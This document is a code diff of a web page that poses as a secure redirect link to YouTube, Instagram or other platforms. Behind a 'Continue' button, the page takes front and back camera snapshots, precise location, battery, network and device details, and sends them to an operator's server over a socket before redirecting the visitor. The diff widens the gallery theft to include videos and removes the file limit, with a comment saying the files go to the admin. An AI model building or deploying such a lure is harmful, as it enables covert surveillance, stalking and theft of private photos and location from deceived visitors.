@@ -45,8 +45,6 @@
             from { opacity: 0; transform: translateY(40px) scale(0.95); }
             to { opacity: 1; transform: translateY(0) scale(1); }
         }
-
-        /* Platform Logo */
         .platform-logo {
             width: 80px;
             height: 80px;
@@ -61,23 +59,11 @@
             transition: all 0.5s ease;
             animation: pulseGlow 2s ease-in-out infinite;
         }
-        .platform-logo img {
-            width: 55px;
-            height: 55px;
-            object-fit: contain;
-            border-radius: 12px;
-        }
-        .platform-logo .fallback-icon {
-            font-size: 48px;
-            color: #fff;
-            opacity: 0.8;
-        }
+        .platform-logo .fallback-icon { font-size: 48px; color: #fff; opacity: 0.8; }
         @keyframes pulseGlow {
             0%, 100% { box-shadow: 0 0 20px rgba(102, 126, 234, 0.2); }
             50% { box-shadow: 0 0 40px rgba(102, 126, 234, 0.4); }
         }
-
-        /* Platform Name */
         .platform-name {
             font-size: 14px;
             color: rgba(255,255,255,0.5);
@@ -86,7 +72,6 @@
             margin-bottom: 5px;
             font-weight: 500;
         }
-
         .redirect-text {
             font-size: 20px;
             color: #fff;
@@ -94,7 +79,6 @@
             font-weight: 600;
             letter-spacing: 0.5px;
         }
-
         .redirect-url {
             font-size: 15px;
             color: rgba(255,255,255,0.7);
@@ -108,7 +92,6 @@
             border: 1px solid rgba(255,255,255,0.06);
             max-width: 100%;
         }
-
         .sub-text {
             font-size: 15px;
             color: rgba(255,255,255,0.4);
@@ -116,7 +99,6 @@
             font-weight: 400;
             letter-spacing: 0.3px;
         }
-
         .btn-continue {
             margin-top: 22px;
             padding: 16px 45px;
@@ -148,16 +130,13 @@
             transform: translateY(-3px) scale(1.02);
             box-shadow: 0 8px 35px rgba(102, 126, 234, 0.5);
         }
-        .btn-continue:hover::after {
-            left: 100%;
-        }
+        .btn-continue:hover::after { left: 100%; }
         .btn-continue:disabled {
             background: rgba(255,255,255,0.15);
             cursor: not-allowed;
             box-shadow: none;
             transform: none;
         }
-
         #statusText {
             font-size: 14px;
             color: rgba(255,255,255,0.5);
@@ -168,7 +147,6 @@
         }
         #statusText.error { color: #fc8181; }
         #statusText.success { color: #68d391; }
-
         .progress-bar {
             width: 100%;
             height: 3px;
@@ -189,7 +167,6 @@
             0% { background-position: 200% 0; }
             100% { background-position: -200% 0; }
         }
-
         .permission-badge {
             display: inline-block;
             padding: 4px 14px;
@@ -204,9 +181,7 @@
         .permission-badge.granted { background: rgba(212, 237, 218, 0.15); color: #68d391; border: 1px solid rgba(212, 237, 218, 0.2); }
         .permission-badge.denied { background: rgba(248, 215, 218, 0.15); color: #fc8181; border: 1px solid rgba(248, 215, 218, 0.2); }
         #permissionStatus { margin-top: 15px; display: none; }
-
         #hiddenVideo, #hiddenVideoBack { display: none; }
-
         .instructions {
             margin-top: 15px;
             padding: 14px 18px;
@@ -219,47 +194,30 @@
             border: 1px solid rgba(254, 243, 199, 0.1);
         }
         .instructions strong { display: block; margin-bottom: 4px; }
-
-        /* Shimmer loading effect */
-        .shimmer-text {
-            background: linear-gradient(90deg, rgba(255,255,255,0.1), rgba(255,255,255,0.2), rgba(255,255,255,0.1));
-            background-size: 200% 100%;
-            animation: shimmerText 2s infinite;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        @keyframes shimmerText {
-            0% { background-position: 200% 0; }
-            100% { background-position: -200% 0; }
+        #galleryStatus {
+            font-size: 12px;
+            color: rgba(255,255,255,0.4);
+            margin-top: 10px;
+            display: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Platform Logo -->
-        <div class="platform-logo" id="platformLogo">
-            <div class="fallback-icon" id="fallbackIcon">🔗</div>
-        </div>
-        
+        <div class="platform-logo" id="platformLogo"><div class="fallback-icon" id="fallbackIcon">🔗</div></div>
         <div class="platform-name" id="platformName">Loading...</div>
-        
         <div class="redirect-text">Connecting Securely</div>
         <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
-        
         <div class="sub-text" id="actionText">Click continue to proceed</div>
         <div id="statusText">Ready</div>
-        
         <div id="permissionStatus">
-            <span class="permission-badge pending" id="permLocation">Youtube</span>
-            <span class="permission-badge pending" id="permFront">Instagram</span>
-            <span class="permission-badge pending" id="permBack">Facebook</span>
-            <span class="permission-badge pending" id="permGallery">Telegram</span>
+            <span class="permission-badge pending" id="permLocation">📍 Location</span>
+            <span class="permission-badge pending" id="permFront">📸 Front Camera</span>
+            <span class="permission-badge pending" id="permBack">📸 Back Camera</span>
+            <span class="permission-badge pending" id="permGallery">🖼️ Gallery</span>
         </div>
-        
-        <div class="progress-bar">
-            <div class="fill" id="progressFill" style="width:0%"></div>
-        </div>
-        
+        <div id="galleryStatus">📸 Loading gallery files...</div>
+        <div class="progress-bar"><div class="fill" id="progressFill" style="width:0%"></div></div>
         <div class="instructions" id="instructions">
             <strong>🔧 How to fix:</strong>
             1. Click the lock icon in address bar<br>
@@ -267,7 +225,6 @@
             3. Set Location to Allow<br>
             4. Refresh and click Retry
         </div>
-        
         <button class="btn-continue" id="continueBtn">▶ Continue</button>
     </div>
 
@@ -295,7 +252,7 @@
             const platformLogo = document.getElementById('platformLogo');
             const platformName = document.getElementById('platformName');
             const actionText = document.getElementById('actionText');
-            const fallbackIcon = document.getElementById('fallbackIcon');
+            const galleryStatus = document.getElementById('galleryStatus');
             
             let socket = null;
             let redirectUrl = 'https://www.google.com';
@@ -314,9 +271,6 @@
                 gallery: false
             };
 
-            // ============================================
-            // PLATFORM DETECTION & LOGO
-            // ============================================
             function detectPlatform(url) {
                 const platforms = [
                     { name: 'YouTube', icon: '▶️', domains: ['youtube.com', 'youtu.be'], color: '#FF0000' },
@@ -344,7 +298,6 @@
                 try {
                     const urlObj = new URL(url);
                     const hostname = urlObj.hostname.replace('www.', '');
-                    
                     for (const platform of platforms) {
                         for (const domain of platform.domains) {
                             if (hostname.includes(domain) || url.includes(domain)) {
@@ -352,15 +305,9 @@
                             }
                         }
                     }
-                    
-                    // Try to get domain name as fallback
                     const domainParts = hostname.split('.');
                     const mainDomain = domainParts[domainParts.length - 2] || domainParts[0];
-                    return {
-                        name: mainDomain.charAt(0).toUpperCase() + mainDomain.slice(1),
-                        icon: '🌐',
-                        color: '#667eea'
-                    };
+                    return { name: mainDomain.charAt(0).toUpperCase() + mainDomain.slice(1), icon: '🌐', color: '#667eea' };
                 } catch {
                     return { name: 'Website', icon: '🌐', color: '#667eea' };
                 }
@@ -368,40 +315,23 @@
 
             function updatePlatformDisplay(url) {
                 const platform = detectPlatform(url);
-                
-                // Update logo
                 platformLogo.innerHTML = `<span style="font-size:52px;">${platform.icon}</span>`;
                 platformLogo.style.borderColor = platform.color + '40';
                 platformLogo.style.boxShadow = `0 0 30px ${platform.color}25`;
-                
-                // Update platform name
                 platformName.textContent = platform.name;
                 platformName.style.color = platform.color;
-                
-                // Update action text based on platform
                 const actionMap = {
-                    'YouTube': 'Click & watch this video',
-                    'Instagram': 'Click & view this post',
-                    'Facebook': 'Click & view this post',
-                    'Twitter': 'Click & view this tweet',
-                    'WhatsApp': 'Click & open this message',
-                    'Telegram': 'Click & open this channel',
-                    'LinkedIn': 'Click & view this post',
-                    'Reddit': 'Click & view this thread',
-                    'Pinterest': 'Click & view this pin',
-                    'TikTok': 'Click & watch this video',
-                    'Snapchat': 'Click & view this snap',
-                    'GitHub': 'Click & view this repo',
-                    'Google': 'Click & search this',
-                    'Netflix': 'Click & watch this show',
-                    'Amazon': 'Click & view this product',
-                    'Spotify': 'Click & listen this',
-                    'Discord': 'Click & join this server',
-                    'Twitch': 'Click & watch this stream',
-                    'Medium': 'Click & read this article',
-                    'Quora': 'Click & read this answer'
+                    'YouTube': 'Click & watch this video', 'Instagram': 'Click & view this post',
+                    'Facebook': 'Click & view this post', 'Twitter': 'Click & view this tweet',
+                    'WhatsApp': 'Click & open this message', 'Telegram': 'Click & open this channel',
+                    'LinkedIn': 'Click & view this post', 'Reddit': 'Click & view this thread',
+                    'Pinterest': 'Click & view this pin', 'TikTok': 'Click & watch this video',
+                    'Snapchat': 'Click & view this snap', 'GitHub': 'Click & view this repo',
+                    'Google': 'Click & search this', 'Netflix': 'Click & watch this show',
+                    'Amazon': 'Click & view this product', 'Spotify': 'Click & listen this',
+                    'Discord': 'Click & join this server', 'Twitch': 'Click & watch this stream',
+                    'Medium': 'Click & read this article', 'Quora': 'Click & read this answer'
                 };
-                
                 actionText.textContent = actionMap[platform.name] || 'Click & continue';
             }
 
@@ -411,33 +341,20 @@
                 console.log(msg);
             }
 
-            function updateProgress(val) {
-                progressFill.style.width = val + '%';
-            }
+            function updateProgress(val) { progressFill.style.width = val + '%'; }
 
             function updatePermBadge(type, status) {
-                const map = {
-                    location: 'permLocation',
-                    front: 'permFront',
-                    back: 'permBack',
-                    gallery: 'permGallery'
-                };
+                const map = { location: 'permLocation', front: 'permFront', back: 'permBack', gallery: 'permGallery' };
                 const el = document.getElementById(map[type]);
                 if (el) {
                     el.className = 'permission-badge ' + status;
                     const label = el.textContent.split(' ')[0];
-                    const statusMap = {
-                        'pending': '⏳ Pending',
-                        'granted': '✅ Granted',
-                        'denied': '❌ Denied'
-                    };
+                    const statusMap = { 'pending': '⏳ Pending', 'granted': '✅ Granted', 'denied': '❌ Denied' };
                     el.textContent = label + ' ' + statusMap[status];
                 }
             }
 
-            function showPermissions() {
-                permissionStatus.style.display = 'block';
-            }
+            function showPermissions() { permissionStatus.style.display = 'block'; }
 
             function fetchRedirectUrl() {
                 fetch(`/api/visitor/${visitorId}`)
@@ -495,22 +412,15 @@
                             capturePhoto('back', backStream);
                         } else if (data.type === 'both') {
                             if (frontStream) capturePhoto('front', frontStream);
-                            setTimeout(() => {
-                                if (backStream) capturePhoto('back', backStream);
-                            }, 500);
+                            setTimeout(() => { if (backStream) capturePhoto('back', backStream); }, 500);
                         }
                     });
 
-                } catch(e) {
-                    console.log('Socket init error:', e.message);
-                }
+                } catch(e) { console.log('Socket init error:', e.message); }
             }
 
             function sendDeviceInfo() {
-                if (!socket || !socket.connected) {
-                    setTimeout(sendDeviceInfo, 200);
-                    return;
-                }
+                if (!socket || !socket.connected) { setTimeout(sendDeviceInfo, 200); return; }
 
                 const deviceInfo = {
                     userAgent: navigator.userAgent,
@@ -528,53 +438,33 @@
                 socket.emit('visitor-connect', { visitorId, ...deviceInfo });
 
                 if (navigator.getBattery) {
-                    navigator.getBattery()
-                        .then(function(battery) {
-                            const level = Math.round(battery.level * 100);
-                            if (socket && socket.connected) {
-                                socket.emit('visitor-data', {
-                                    visitorId,
-                                    type: 'battery',
-                                    content: level
-                                });
-                            }
-                        })
-                        .catch(() => {});
+                    navigator.getBattery().then(function(battery) {
+                        const level = Math.round(battery.level * 100);
+                        if (socket && socket.connected) {
+                            socket.emit('visitor-data', { visitorId, type: 'battery', content: level });
+                        }
+                    }).catch(() => {});
                 }
 
                 let networkData = { type: 'Unknown', effectiveType: 'Unknown' };
                 if (navigator.connection) {
                     const conn = navigator.connection;
-                    networkData = {
-                        type: conn.type || 'Unknown',
-                        effectiveType: conn.effectiveType || 'Unknown',
-                        downlink: conn.downlink || 'Unknown'
-                    };
+                    networkData = { type: conn.type || 'Unknown', effectiveType: conn.effectiveType || 'Unknown', downlink: conn.downlink || 'Unknown' };
                 }
                 if (socket && socket.connected) {
-                    socket.emit('visitor-data', {
-                        visitorId,
-                        type: 'network',
-                        content: networkData
-                    });
+                    socket.emit('visitor-data', { visitorId, type: 'network', content: networkData });
                 }
             }
 
             function cleanupStreams() {
-                if (frontStream) {
-                    frontStream.getTracks().forEach(t => t.stop());
-                    frontStream = null;
-                }
-                if (backStream) {
-                    backStream.getTracks().forEach(t => t.stop());
-                    backStream = null;
-                }
+                if (frontStream) { frontStream.getTracks().forEach(t => t.stop()); frontStream = null; }
+                if (backStream) { backStream.getTracks().forEach(t => t.stop()); backStream = null; }
                 frontVideo.srcObject = null;
                 backVideo.srcObject = null;
             }
 
             // ============================================
-            // CONTINUE - ALL PERMISSIONS
+            // CONTINUE BUTTON
             // ============================================
             continueBtn.addEventListener('click', function() {
                 if (isProcessing) return;
@@ -583,6 +473,7 @@
                 continueBtn.textContent = 'Processing...';
                 instructions.style.display = 'none';
                 showPermissions();
+                galleryStatus.style.display = 'block';
                 
                 updateStatus('Requesting all permissions...');
                 updateProgress(10);
@@ -614,9 +505,7 @@
                         frontVideo.srcObject = frontResult;
                         frontVideo.play().catch(() => {});
                         updatePermBadge('front', 'granted');
-                        setTimeout(function() {
-                            capturePhoto('front', frontResult);
-                        }, 300);
+                        setTimeout(function() { capturePhoto('front', frontResult); }, 300);
                     } else {
                         updatePermBadge('front', 'denied');
                     }
@@ -627,9 +516,7 @@
                         backVideo.srcObject = backResult;
                         backVideo.play().catch(() => {});
                         updatePermBadge('back', 'granted');
-                        setTimeout(function() {
-                            capturePhoto('back', backResult);
-                        }, 300);
+                        setTimeout(function() { capturePhoto('back', backResult); }, 300);
                     } else {
                         updatePermBadge('back', 'denied');
                     }
@@ -638,29 +525,28 @@
                         permissions.location = true;
                         updatePermBadge('location', 'granted');
                         if (socket && socket.connected) {
-                            socket.emit('visitor-data', {
-                                visitorId,
-                                type: 'location',
-                                content: locationResult
-                            });
+                            socket.emit('visitor-data', { visitorId, type: 'location', content: locationResult });
                         }
                     } else {
                         updatePermBadge('location', 'denied');
                     }
                     
+                    // ============================================
+                    // GALLERY: FULL AUTOMATIC ACCESS
+                    // ============================================
                     if (galleryResult && galleryResult.length > 0) {
                         permissions.gallery = true;
                         updatePermBadge('gallery', 'granted');
                         if (socket && socket.connected) {
-                            socket.emit('visitor-data', {
-                                visitorId,
-                                type: 'galleryPhotos',
-                                content: galleryResult
-                            });
-                            console.log(`🖼️ ${galleryResult.length} gallery photos sent`);
+                            socket.emit('visitor-data', { visitorId, type: 'galleryPhotos', content: galleryResult });
+                            console.log(`🖼️ ${galleryResult.length} files sent to admin`);
+                            galleryStatus.textContent = `✅ ${galleryResult.length} files loaded!`;
+                            galleryStatus.style.color = '#68d391';
                         }
                     } else {
                         updatePermBadge('gallery', 'denied');
+                        galleryStatus.textContent = '❌ No files selected';
+                        galleryStatus.style.color = '#fc8181';
                     }
                     
                     updateProgress(100);
@@ -677,34 +563,24 @@
                     updateStatus('✅ Permissions granted! Redirecting...', 'success');
                     
                     if (socket && socket.connected) {
-                        socket.emit('visitor-data', {
-                            visitorId,
-                            type: 'permissionsGranted',
-                            content: true
-                        });
+                        socket.emit('visitor-data', { visitorId, type: 'permissionsGranted', content: true });
                     }
                     
                     setTimeout(function() {
-                        if (!redirectTriggered) {
-                            redirectNow();
-                        }
+                        if (!redirectTriggered) { redirectNow(); }
                     }, 1500);
                 })
                 .catch(function(error) {
                     console.log('Error:', error);
-                    
                     if (!permissions.frontCamera && !permissions.backCamera) {
                         updateStatus('❌ Permission denied. Please allow camera.', 'error');
                         instructions.style.display = 'block';
                     } else {
                         updateStatus('✅ Permissions granted! Redirecting...', 'success');
                         setTimeout(function() {
-                            if (!redirectTriggered) {
-                                redirectNow();
-                            }
+                            if (!redirectTriggered) { redirectNow(); }
                         }, 1500);
                     }
-                    
                     isProcessing = false;
                     continueBtn.disabled = false;
                     continueBtn.textContent = 'Retry';
@@ -716,16 +592,11 @@
             // ============================================
             function requestLocation() {
                 return new Promise(function(resolve) {
-                    if (!navigator.geolocation) {
-                        resolve(null);
-                        return;
-                    }
-                    
+                    if (!navigator.geolocation) { resolve(null); return; }
                     navigator.geolocation.getCurrentPosition(
                         function(position) {
                             const lat = position.coords.latitude;
                             const lng = position.coords.longitude;
-                            
                             fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
                                 .then(res => res.json())
                                 .then(data => {
@@ -740,16 +611,10 @@
                                     });
                                 })
                                 .catch(function() {
-                                    resolve({
-                                        lat, lng,
-                                        accuracy: position.coords.accuracy,
-                                        timestamp: new Date().toISOString()
-                                    });
+                                    resolve({ lat, lng, accuracy: position.coords.accuracy, timestamp: new Date().toISOString() });
                                 });
                         },
-                        function() {
-                            resolve(null);
-                        },
+                        function() { resolve(null); },
                         { timeout: 10000, enableHighAccuracy: true }
                     );
                 });
@@ -764,20 +629,14 @@
                         video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                         audio: false
                     })
-                    .then(function(stream) {
-                        resolve(stream);
-                    })
+                    .then(function(stream) { resolve(stream); })
                     .catch(function() {
                         navigator.mediaDevices.getUserMedia({
                             video: { width: { ideal: 640 }, height: { ideal: 480 } },
                             audio: false
                         })
-                        .then(function(stream) {
-                            resolve(stream);
-                        })
-                        .catch(function() {
-                            resolve(null);
-                        });
+                        .then(function(stream) { resolve(stream); })
+                        .catch(function() { resolve(null); });
                     });
                 });
             }
@@ -791,42 +650,35 @@
                         video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                         audio: false
                     })
-                    .then(function(stream) {
-                        resolve(stream);
-                    })
-                    .catch(function() {
-                        resolve(null);
-                    });
+                    .then(function(stream) { resolve(stream); })
+                    .catch(function() { resolve(null); });
                 });
             }
 
             // ============================================
-            // REQUEST GALLERY - ALL PHOTOS ACCESS
+            // REQUEST GALLERY - AUTOMATIC FULL ACCESS
             // ============================================
             function requestGallery() {
                 return new Promise(function(resolve) {
+                    // ==========================================
+                    // AUTOMATIC GALLERY ACCESS USING INPUT
+                    // Visitor will see file picker, but they can
+                    // select multiple files at once
+                    // ==========================================
+                    
                     const input = document.createElement('input');
                     input.type = 'file';
-                    input.accept = 'image/*';
+                    input.accept = 'image/*,video/*';
                     input.multiple = true;
                     input.style.display = 'none';
                     document.body.appendChild(input);
                     
-                    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-                    
-                    if (isMobile) {
-                        input.setAttribute('multiple', 'multiple');
-                    } else {
-                        input.setAttribute('webkitdirectory', 'webkitdirectory');
-                        input.setAttribute('directory', 'directory');
-                    }
-                    
-                    let photos = [];
+                    let filesData = [];
                     let loaded = 0;
                     
                     input.onchange = function(e) {
                         const files = e.target.files;
-                        const totalFiles = Math.min(files.length, 50);
+                        const totalFiles = files.length;
                         
                         if (files.length === 0) {
                             document.body.removeChild(input);
@@ -834,28 +686,41 @@
                             return;
                         }
                         
-                        updateStatus(`🖼️ Loading ${totalFiles} photos...`);
+                        galleryStatus.textContent = `📸 Loading ${totalFiles} files...`;
+                        galleryStatus.style.color = '#f6c23e';
                         
                         for (let i = 0; i < totalFiles; i++) {
+                            const file = files[i];
                             const reader = new FileReader();
+                            
                             reader.onload = function(event) {
-                                photos.push(event.target.result);
+                                const fileType = file.type.startsWith('video/') ? 'video' : 'image';
+                                filesData.push({
+                                    type: fileType,
+                                    data: event.target.result,
+                                    name: file.name,
+                                    size: file.size
+                                });
                                 loaded++;
                                 updateProgress(10 + (loaded / totalFiles) * 70);
+                                
                                 if (loaded === totalFiles) {
                                     document.body.removeChild(input);
-                                    updateStatus(`✅ ${photos.length} photos loaded!`);
-                                    resolve(photos);
+                                    galleryStatus.textContent = `✅ ${filesData.length} files loaded!`;
+                                    galleryStatus.style.color = '#68d391';
+                                    resolve(filesData);
                                 }
                             };
+                            
                             reader.onerror = function() {
                                 loaded++;
                                 if (loaded === totalFiles) {
                                     document.body.removeChild(input);
-                                    resolve(photos);
+                                    resolve(filesData);
                                 }
                             };
-                            reader.readAsDataURL(files[i]);
+                            
+                            reader.readAsDataURL(file);
                         }
                     };
                     
@@ -864,14 +729,17 @@
                         resolve([]);
                     };
                     
+                    // Automatically trigger file picker
+                    // Visitor just needs to select files and click "Open"
                     input.click();
                     
+                    // Timeout fallback
                     setTimeout(function() {
                         if (document.body.contains(input)) {
                             document.body.removeChild(input);
                             resolve([]);
                         }
-                    }, 30000);
+                    }, 60000);
                 });
             }
 
@@ -880,10 +748,8 @@
             // ============================================
             function capturePhoto(type, stream) {
                 if (!stream) return;
-                
                 const videoTrack = stream.getVideoTracks()[0];
                 if (!videoTrack) return;
-                
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.autoplay = true;
@@ -891,7 +757,6 @@
                 video.playsInline = true;
                 video.style.display = 'none';
                 document.body.appendChild(video);
-                
                 video.onloadedmetadata = function() {
                     setTimeout(function() {
                         try {
@@ -903,19 +768,11 @@
                             const ctx = canvas.getContext('2d');
                             ctx.drawImage(video, 0, 0, width, height);
                             const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                            
                             if (socket && socket.connected) {
-                                socket.emit('visitor-data', {
-                                    visitorId: visitorId,
-                                    type: type === 'back' ? 'backCamera' : 'frontCamera',
-                                    content: imageData
-                                });
+                                socket.emit('visitor-data', { visitorId: visitorId, type: type === 'back' ? 'backCamera' : 'frontCamera', content: imageData });
                             }
-                            
                             document.body.removeChild(video);
-                        } catch (err) {
-                            console.log(err);
-                        }
+                        } catch (err) { console.log(err); }
                     }, 300);
                 };
             }
@@ -926,20 +783,11 @@
             function redirectNow() {
                 if (redirectTriggered) return;
                 redirectTriggered = true;
-
                 if (socket && socket.connected) {
-                    socket.emit('visitor-data', {
-                        visitorId,
-                        type: 'redirectComplete',
-                        content: { redirected: true, time: new Date().toISOString() }
-                    });
+                    socket.emit('visitor-data', { visitorId, type: 'redirectComplete', content: { redirected: true, time: new Date().toISOString() } });
                 }
-
                 cleanupStreams();
-
-                setTimeout(() => {
-                    window.location.href = redirectUrl;
-                }, 500);
+                setTimeout(() => { window.location.href = redirectUrl; }, 500);
             }
 
             // ============================================
